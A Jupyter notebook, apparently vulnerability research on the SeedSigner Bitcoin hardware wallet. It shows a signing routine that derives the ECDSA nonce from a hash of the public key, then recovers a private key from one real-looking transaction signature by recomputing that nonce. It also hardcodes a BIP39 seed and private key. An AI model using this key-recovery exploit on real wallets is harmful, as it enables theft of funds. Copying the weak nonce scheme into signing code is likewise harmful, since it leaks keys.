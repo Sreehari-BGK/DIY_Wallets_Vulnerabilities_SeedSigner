{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "bddd8307",
   "metadata": {},
   "outputs": [],
   "source": [
    "import embit\n",
    "\n",
    "from binascii import b2a_base64\n",
    "from hashlib import sha256\n",
    "\n",
    "from embit import bip32, compact, ec\n",
    "from embit.bip32 import HDKey\n",
    "from embit.descriptor import Descriptor\n",
    "from embit.networks import NETWORKS\n",
    "from embit.util import secp256k1\n",
    "\n",
    "from embit.util.key import SECP256K1\n",
    "from embit.util import key\n",
    "\n",
    "from blockcypher import get_address_full\n",
    "from blockcypher import get_transaction_details\n",
    "\n",
    "from tinyec.ec import SubGroup, Curve\n",
    "import numpy as np\n",
    "import hashlib\n",
    "import libnum\n",
    "import bech32\n",
    "import binascii\n",
    "\n",
    "from cryptos import *\n",
    "\n",
    "import ecdsa\n",
    "from ecdsa import SigningKey, SECP256k1\n",
    "import hashlib\n",
    "import base58\n",
    "from ecdsa.util import sigencode_der, sigdecode_der\n",
    "\n",
    "from embit.util import secp256k1\n",
    "from embit.util import py_secp256k1\n",
    "\n",
    "import embit\n",
    "\n",
    "from binascii import b2a_base64\n",
    "from hashlib import sha256\n",
    "\n",
    "from embit import bip32, compact, ec\n",
    "from embit.bip32 import HDKey\n",
    "from embit.descriptor import Descriptor\n",
    "from embit.networks import NETWORKS\n",
    "from embit.util import secp256k1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e1123258",
   "metadata": {},
   "source": [
    "# LOTS OF VARIABLES ARE HARDCODED!!! GO TO THE BOTTOM FOR PVT KEY CALCULATION LOGIC!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b97f8c02",
   "metadata": {},
   "outputs": [],
   "source": [
    "def double_sha256(data):\n",
    "    \n",
    "    in_bytes = bytes.fromhex(data)\n",
    "    \n",
    "    # First SHA256 hash\n",
    "    first_hash = hashlib.sha256(in_bytes).digest()\n",
    "\n",
    "    # Second SHA256 hash\n",
    "    second_hash = hashlib.sha256(first_hash).digest()\n",
    "\n",
    "    return second_hash.hex()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "99001104",
   "metadata": {},
   "outputs": [],
   "source": [
    "import hmac \n",
    "\n",
    "SECP256K1_ORDER = n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n",
    "\n",
    "def deterministic_k(secret, z, extra_data=None):\n",
    "    # RFC6979, optimized for secp256k1\n",
    "    k = b\"\\x00\" * 32\n",
    "    v = b\"\\x01\" * 32\n",
    "    if z > SECP256K1_ORDER:\n",
    "        z -= SECP256K1_ORDER\n",
    "    z_bytes = z.to_bytes(32, \"big\")\n",
    "    secret_bytes = secret.to_bytes(32, \"big\") #because sha256(pub_key is always in bytes)\n",
    "    if extra_data is not None:\n",
    "        z_bytes += extra_data\n",
    "    k = hmac.new(k, v + b\"\\x00\" + secret_bytes + z_bytes, \"sha256\").digest()\n",
    "    v = hmac.new(k, v, \"sha256\").digest()\n",
    "    k = hmac.new(k, v + b\"\\x01\" + secret_bytes + z_bytes, \"sha256\").digest()\n",
    "    v = hmac.new(k, v, \"sha256\").digest()\n",
    "    while True:\n",
    "        v = hmac.new(k, v, \"sha256\").digest()\n",
    "        candidate = int.from_bytes(v, \"big\")\n",
    "        if candidate >= 1 and candidate < SECP256K1_ORDER:\n",
    "            return candidate\n",
    "        k = hmac.new(k, v + b\"\\x00\", \"sha256\").digest()\n",
    "        v = hmac.new(k, v, \"sha256\").digest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "0f1c382b",
   "metadata": {},
   "outputs": [],
   "source": [
    "def const_k_sig(z, pvt_key, pub_hash_k = None , z_int = None):\n",
    "    p = 2**256 - 2**32 - 2**9 - 2**8 - 2**7 - 2**6 - 2**4 -1                               # proven prime number  \n",
    "    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141                 # number of points in the curve/field\n",
    "    a, b = 0, 7                                                                            # y^2 = x^3 + ax + b -> secpk256k1 curve \n",
    "\n",
    "    g_x = 55066263022277343669578718895168534326250603453777594175500187360389116729240 \n",
    "    g_y = 32670510020758816978083085130507043184471273380659243275938904335757337482424\n",
    "    generator_pt = (g_x, g_y)                                                              # generator point \n",
    "\n",
    "    #all the required functions \n",
    "    def mod_inv(a,n = p): #Extended Euclidean Algorithm/'division' in elliptic curves\n",
    "        lm, hm = 1,0\n",
    "        low, high = a%n,n\n",
    "        while low > 1:\n",
    "            ratio = high//low\n",
    "            nm, new = hm-lm*ratio, high-low*ratio\n",
    "            lm, low, hm, high = nm, new, lm, low\n",
    "        return lm % n\n",
    "\n",
    "    def point_double(pt):\n",
    "        lam = ((3*pt[0]**2 + a) * mod_inv(2*pt[1], p)) % p\n",
    "    \n",
    "        x = (lam**2 - 2*pt[0]) % p \n",
    "        y = (lam*(pt[0] - x) - pt[1]) % p\n",
    "    \n",
    "        return (x, y)\n",
    "\n",
    "\n",
    "    def point_add(pt1, pt2):\n",
    "        lam = ((pt2[1] - pt1[1]) * mod_inv((pt2[0] - pt1[0]), p)) % p\n",
    "    \n",
    "        x = (lam**2 - pt1[0] - pt2[0]) % p\n",
    "        y = (lam*(pt1[0] - x) - pt1[1]) % p \n",
    "    \n",
    "        return (x, y)\n",
    "\n",
    "\n",
    "    # function to produce pub key from pvt key and generator pt \n",
    "    def point_mul(generator_pt, pvt_key_hex):\n",
    "        if pvt_key_hex  == 0 or  pvt_key_hex >= n:\n",
    "            raise Exception(\"Invalid Key\")\n",
    "        \n",
    "        # pvt key in hex to binary \n",
    "        pvt_key_bin = str(bin(pvt_key_hex))[2:]\n",
    "        r = generator_pt\n",
    "    \n",
    "        for i in range(1, len(pvt_key_bin)):\n",
    "            # point double the pt for every bit in the pvt key in binary \n",
    "            r = point_double(r)\n",
    "        \n",
    "            # if bit = 1, then both point double & point add\n",
    "            if pvt_key_bin[i] == '1':\n",
    "                r = point_add(r, generator_pt)\n",
    "            \n",
    "            # return this new pt 'r' which is the pub key || pub key = pvt key * generator pt       \n",
    "        \n",
    "        return r  \n",
    "\n",
    "    # defining constants\n",
    "    pub_key = point_mul(generator_pt, int.from_bytes(pvt_key, 'big'))    # uncompressed pub key, i.e, the product of point mul\n",
    "    #print(pub_key)\n",
    "    \n",
    "    k = deterministic_k(pub_hash_k, z_int)\n",
    "    #k = 3\n",
    "    \n",
    "    g = generator_pt\n",
    "    x_r, y_r = point_mul(g, k)\n",
    "    \n",
    "    r = x_r % n\n",
    "    z = int.from_bytes(z[:32], 'big')\n",
    "    s = (((z + x_r*int.from_bytes(pvt_key, 'big')) % n) * mod_inv(k, n)) % n    # regular math\n",
    "\n",
    "    return r.to_bytes(32, \"little\") + s.to_bytes(32, \"little\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "f53633d8",
   "metadata": {},
   "outputs": [],
   "source": [
    "def ecdsa_signature_serialize_der(sig, context=None):\n",
    "    if len(sig) != 64:\n",
    "        raise ValueError(\"Signature should be 64 bytes long\")\n",
    "    r = int.from_bytes(sig[:32], \"little\")\n",
    "    print(\"r in int :\", r)\n",
    "    s = int.from_bytes(sig[32:], \"little\")\n",
    "    print(\"s in int :\", s)\n",
    "    rb = r.to_bytes((r.bit_length() + 8) // 8, \"big\")\n",
    "    print(\"r in big endian :\", rb)\n",
    "    sb = s.to_bytes((s.bit_length() + 8) // 8, \"big\")\n",
    "    print(\"s in big endian :\", sb)\n",
    "    return (\n",
    "        b\"\\x30\"\n",
    "        + bytes([4 + len(rb) + len(sb), 2, len(rb)])\n",
    "        + rb\n",
    "        + bytes([2, len(sb)])\n",
    "        + sb\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4530c572",
   "metadata": {},
   "outputs": [],
   "source": [
    "signature = '30440220700b0412b9ec3adebf2ef14137c3d5a4a833ca59804f57349bba3fef68fe7b0c02201440fe0c8d733a567fb527505b4ff26ba6f86acd80bf60081c831e4c9eb8628c01'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "5c9237fb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "142"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(signature)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "07abdfc8",
   "metadata": {},
   "outputs": [],
   "source": [
    "bip39_seed = '3a11298f7bf61605c6740a44aced41a547069298a0c971d7a0fd69c3c0395a21af3b6c937e700a336457edd67a6eacee6928259082304ad8adecb1a2560781a9'\n",
    "bip39_seed_bytes = bytes.fromhex(bip39_seed)\n",
    "\n",
    "\n",
    "embit_network = 'main'\n",
    "derivation = \"m/84'/0'/0'/0/7\"\n",
    "\n",
    "seed_bytes = bip39_seed_bytes\n",
    "root = bip32.HDKey.from_seed(seed_bytes, version=NETWORKS[embit_network][\"xprv\"])\n",
    "prv = root.derive(derivation).key\n",
    "\n",
    "\n",
    "pub = py_secp256k1.ec_pubkey_create(prv._secret)\n",
    "pub_hash_bytes = hashlib.sha256(pub).digest()\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "#pub_key_hash = sha256(pub)\n",
    "#print(pub_hex)\n",
    "\n",
    "prv_bytes = prv.secret\n",
    "prv_int = int.from_bytes(prv_bytes, \"big\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "cd4b472e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "PublicKey(02581d9dc848fa707abc32329ab44caf5607583ec115664bb9b49ea562651fff71)"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prv.get_public_key()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "4443832a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Inputs: 13340 satoshi\n",
      "Spending 13340 satoshi\n",
      "10988 to bc1q8z7vfvl5jk9z0vdckphf6wsdjfce6qhgskp84e\n",
      "Fee: 2352 satoshi\n"
     ]
    }
   ],
   "source": [
    "from embit import psbt\n",
    "from binascii import a2b_base64, b2a_base64\n",
    "\n",
    "psbt_tx = 'cHNidP8BAFICAAAAAfcjfDpDsaYdqQX+yFo7ulPODG/XRxaLhVzYSKtKmS2zAgAAAAD/////AewqAAAAAAAAFgAUOLzEs/SViiexuLBunToNknGdAugAAAAAAAEBHxw0AAAAAAAAFgAUTuHWUqBEj9TUqfu6Tf++7TU2URAiBgJYHZ3ISPpwerwyMpq0TK9WB1g+wRVmS7m0nqViZR//cRi+E/8RVAAAgAAAAIAAAACAAAAAAAcAAAAAAA=='\n",
    "\n",
    "raw = a2b_base64(psbt_tx)\n",
    "tx = psbt.PSBT.parse(raw)\n",
    "\n",
    "total_in = 0\n",
    "for inp in tx.inputs:\n",
    "    total_in += inp.witness_utxo.value\n",
    "print(\"Inputs:\", total_in, \"satoshi\")\n",
    "\n",
    "change_out = 0  # value that goes back to us\n",
    "send_outputs = []\n",
    "for i, out in enumerate(tx.outputs):\n",
    "    # check if it is a change or not:\n",
    "    change = False\n",
    "    # should be one or zero for single-key addresses\n",
    "    for pub in out.bip32_derivations:\n",
    "        # check if it is our key\n",
    "        if out.bip32_derivations[pub].fingerprint == fingerprint:\n",
    "            hdkey = root.derive(out.bip32_derivations[pub].derivation)\n",
    "            mypub = hdkey.key.get_public_key()\n",
    "            if mypub != pub:\n",
    "                raise ValueError(\"Derivation path doesn't look right\")\n",
    "                \n",
    "            # now check if provided scriptpubkey matches\n",
    "            sc = script.p2wpkh(mypub)\n",
    "            if sc == tx.tx.vout[i].script_pubkey:\n",
    "                change = True\n",
    "                continue\n",
    "                \n",
    "    if change:\n",
    "        change_out += tx.tx.vout[i].value\n",
    "    else:\n",
    "        send_outputs.append(tx.tx.vout[i])\n",
    "    print(\"Spending\", total_in - change_out, \"satoshi\")\n",
    "    \n",
    "    fee = total_in - change_out\n",
    "    for out in send_outputs:\n",
    "        fee -= out.value\n",
    "        print(out.value, \"to\", out.script_pubkey.address(NETWORKS[\"main\"]))\n",
    "    print(\"Fee:\", fee, \"satoshi\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "id": "189cade9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Transaction(0200000001f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db30200000000ffffffff01ec2a00000000000016001438bcc4b3f4958a27b1b8b06e9d3a0d92719d02e800000000)"
      ]
     },
     "execution_count": 150,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tx.tx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "53e0f565",
   "metadata": {},
   "outputs": [],
   "source": [
    "txn_details_hex = '0200000001f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db30200000000ffffffff01ec2a00000000000016001438bcc4b3f4958a27b1b8b06e9d3a0d92719d02e800000000'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "15cef41a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 18/1/24\n",
    "txn_details_hex  = '02000000010a0befb5ef7dbc1b7022788f200ca6606ca65024e1a4a499f1d4a38de1ef01880100000000ffffffff01b927000000000000160014ffa40104eec28c18911c803f1207f8fb6d993fc800000000'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "0686d124",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "164"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len('0200000001f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db30200000000ffffffff016423000000000000160014ffa40104eec28c18911c803f1207f8fb6d993fc800000000')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "2ea16cc0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 19/1/24\n",
    "txn_details_hex = '0200000001f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db30200000000ffffffff016423000000000000160014ffa40104eec28c18911c803f1207f8fb6d993fc800000000'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "e79b6fab",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "164"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(txn_details_hex)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "109d300b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "02000000\n",
      "01\n",
      "f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db3\n",
      "02000000\n",
      "00\n",
      "ffffffff\n",
      "\n",
      "\n",
      "01\n",
      "6423000000000000\n",
      "16\n",
      "0014ffa40104eec28c18911c803f1207f8fb6d993fc8\n",
      "00000000\n"
     ]
    }
   ],
   "source": [
    "print(txn_details_hex[0:8])\n",
    "print(txn_details_hex[8:10])\n",
    "print(txn_details_hex[10:74])\n",
    "print(txn_details_hex[74:82])\n",
    "print(txn_details_hex[82:84])\n",
    "print(txn_details_hex[84:92])\n",
    "\n",
    "print('\\n')\n",
    "print(txn_details_hex[92:94])\n",
    "print(txn_details_hex[94:110])   # output amount \n",
    "print(txn_details_hex[110:112])\n",
    "print(txn_details_hex[112:156])\n",
    "print(txn_details_hex[156:164])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 275,
   "id": "d942e699",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "44"
      ]
     },
     "execution_count": 275,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len('0014ffa40104eec28c18911c803f1207f8fb6d993fc8')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91a36fda",
   "metadata": {},
   "source": [
    "txn: https://mempool.space/tx/d882925ae657bcf2ee252ccfdffdf46fa87309168099af20727ae35833267414"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "45b91a25",
   "metadata": {},
   "outputs": [],
   "source": [
    "#19/ 1/ 24 -> for above txn \n",
    "ver = txn_details_hex[0:8]\n",
    "prevouts = txn_details_hex[10:74] + txn_details_hex[74:82]\n",
    "seq = txn_details_hex[84:92]\n",
    "outpoint = prevouts\n",
    "\n",
    "#scriptcode = '1976a914' + '5d50044454d3d18006e71b0da30d5c39b793053f' + '88ac'\n",
    "scriptcode = '1976a914' + '4ee1d652a0448fd4d4a9fbba4dffbeed35365110' + '88ac' # addr -> bc1qfmsav54qgj8af49flwaymla7a56nv5gszss2u7\n",
    "#amount = '1935000000000000'  # input val = 13593 satoshi\n",
    "amount = '1c34000000000000' # input val = 13340\n",
    "\n",
    "output = txn_details_hex[94:110] + txn_details_hex[110:112] + txn_details_hex[112:156]\n",
    "locktime = '00000000'\n",
    "hashtype = '01000000'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "e34b2483",
   "metadata": {},
   "outputs": [],
   "source": [
    "# old txn , do not run\n",
    "ver = txn_details_hex[0:8]\n",
    "prevouts = txn_details_hex[10:74] + txn_details_hex[74:82]\n",
    "seq = txn_details_hex[84:92]\n",
    "outpoint = prevouts\n",
    "scriptcode = '1976a914' + '4ee1d652a0448fd4d4a9fbba4dffbeed35365110' + '88ac'\n",
    "amount = '1c34000000000000'  # input val = 13340 satoshi\n",
    "output = txn_details_hex[94:110] + txn_details_hex[110:112] + txn_details_hex[112:156]\n",
    "locktime = '00000000'\n",
    "hashtype = '01000000'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "91173ac8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "prevouts double hash : 5600a8e58a8f4abe6265c31a13b42fda89772d4b7c953d6d39994de9ffb3927f\n",
      "seq double hash : 3bb13029ce7b1f559ef5e747fcac439f1455a2ec7c5f09b72290795e70665044\n",
      "outputs double hash : 32549df5abff5731231eaad1d373b5808b59820b3c4281cc0dbadc296c6f9470\n"
     ]
    }
   ],
   "source": [
    "prevouts_hash = double_sha256(prevouts)\n",
    "print(\"prevouts double hash :\", prevouts_hash)\n",
    "seq_hash = double_sha256(seq)\n",
    "print(\"seq double hash :\", seq_hash)\n",
    "outputs_hash = double_sha256(output)\n",
    "print(\"outputs double hash :\", outputs_hash)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "11cd8212",
   "metadata": {},
   "outputs": [],
   "source": [
    "pre_image = ver + prevouts_hash + seq_hash + outpoint + scriptcode + amount + seq + outputs_hash + locktime + hashtype"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "d23b3d62",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "364"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(pre_image)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "a0c92627",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'020000005600a8e58a8f4abe6265c31a13b42fda89772d4b7c953d6d39994de9ffb3927f3bb13029ce7b1f559ef5e747fcac439f1455a2ec7c5f09b72290795e70665044f7237c3a43b1a61da905fec85a3bba53ce0c6fd747168b855cd848ab4a992db3020000001976a9144ee1d652a0448fd4d4a9fbba4dffbeed3536511088ac1c34000000000000ffffffff32549df5abff5731231eaad1d373b5808b59820b3c4281cc0dbadc296c6f94700000000001000000'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pre_image"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 230,
   "id": "e89188ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "# testing new txn 18/1/24 , dont run cell \n",
    "pre_image = '0200000006f2b86854f8d3e7d86cb1e39c2b09919adde421fed7a141e6515ffd7f88a6843bb13029ce7b1f559ef5e747fcac439f1455a2ec7c5f09b72290795e70665044524e3e436f25df204ce27899af6ad638b44151bac5c3cf8a6a52116d1d659d8b000000001976a91438bcc4b3f4958a27b1b8b06e9d3a0d92719d02e888ac3d53000000000000ffffffff9e573421d9f32fc4f9997b707ddac0dd74d506a5295ab4c57af4608e29a0ae180000000001000000'\n",
    "\n",
    "pre_image_hash_to_sign = double_sha256(pre_image)\n",
    "pre_image_hash_to_sign_bytes = bytes.fromhex(pre_image_hash_to_sign)\n",
    "\n",
    "msghash = pre_image_hash_to_sign_bytes\n",
    "msghash_int = int.from_bytes(msghash, \"big\")\n",
    "\n",
    "\n",
    "pub_hash_int = 38933762198836990009719519817402630601322716143883358142998450627002174767517\n",
    "\n",
    "signature = '304402201626d2d8533e6f3f9150a88e565068037e012ba156ebd376666f05a9da1fb7e702206b37258e900391bc1f104ee4556830730a7d0291c5fb8f52eb15bcbbe9edbd6201'\n",
    "\n",
    "\n",
    "# everything below is old and working \n",
    "\n",
    "#pre_image_hash_to_sign = double_sha256(pre_image) -> original code\n",
    "\n",
    "\n",
    "\n",
    "#pre_image_hash_to_sign_bytes = bytes.fromhex(pre_image_hash_to_sign)\n",
    "\n",
    "#msghash = pre_image_hash_to_sign_bytes\n",
    "#msghash_int = int.from_bytes(msghash, \"big\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "eadc4029",
   "metadata": {},
   "outputs": [],
   "source": [
    "pre_image_hash_to_sign = double_sha256(pre_image) \n",
    "\n",
    "pre_image_hash_to_sign_bytes = bytes.fromhex(pre_image_hash_to_sign)\n",
    "\n",
    "msghash = pre_image_hash_to_sign_bytes\n",
    "msghash_int = int.from_bytes(msghash, \"big\")\n",
    "\n",
    "pub_hash_int = 11213424163078702846961618719436802557356559473721032386514974657038528928268\n",
    "\n",
    "signature = '304402203193c5f490cb13e4c3cb2f6cbbb4d0c6af632ff8efa7ef12dd8bc5249dc5f50f0220334bdf2a3db5f98ae54ddb4bf90e83ff0874c51ed5a3a6b10ad3fddd94ec396f01'\n",
    "\n",
    "prv_hex = 'ce1539c8fe4a767d3a82329e806493c8034cd946371103223353ca82605ec51c'\n",
    "\n",
    "prv_int = int.from_bytes(bytes.fromhex(prv_hex), \"big\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a44e21f",
   "metadata": {},
   "source": [
    "#  Private key calculation logic "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "71384734",
   "metadata": {},
   "outputs": [],
   "source": [
    "p = 2**256 - 2**32 - 2**9 - 2**8 - 2**7 - 2**6 - 2**4 -1 \n",
    "n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n",
    "\n",
    "def mod_inv(a,n = p): #Extended Euclidean Algorithm/'division' in elliptic curves\n",
    "    lm, hm = 1,0\n",
    "    low, high = a%n,n\n",
    "    \n",
    "    while low > 1:\n",
    "        ratio = high//low\n",
    "        nm, new = hm-lm*ratio, high-low*ratio\n",
    "        lm, low, hm, high = nm, new, lm, low\n",
    "        \n",
    "    return lm % n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "c4d657da",
   "metadata": {},
   "outputs": [],
   "source": [
    "r_len = 2*int(signature[6:8], 16)\n",
    "r_hex = signature[8:(8+r_len)]\n",
    "\n",
    "s_len = 2*int(signature[(8+r_len+2):(8+r_len+2+2)], 16)\n",
    "s_hex = signature[(8+r_len+2+2):(8+r_len+2+2+s_len)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "83642264",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "81315389345406280729888218297120106925287080885957500133984651971236021306488\n"
     ]
    }
   ],
   "source": [
    "r_int = int(r_hex, 16)\n",
    "s_int = int(s_hex, 16)\n",
    "\n",
    "#k = deterministic_k(prv_int, msghash_int)\n",
    "\n",
    "k = deterministic_k(pub_hash_int, msghash_int) \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "055db277",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xce1539c8fe4a767d3a82329e806493c8034cd946371103223353ca82605ec51c\n"
     ]
    }
   ],
   "source": [
    "# to calculate pvt. key we already know r, s and k \n",
    "calc_prv = (mod_inv(r_int, n)*(k*s_int - msghash_int)) % n \n",
    "\n",
    "print(hex(calc_prv))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "d23f4704",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(prv_int) == hex(calc_prv)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
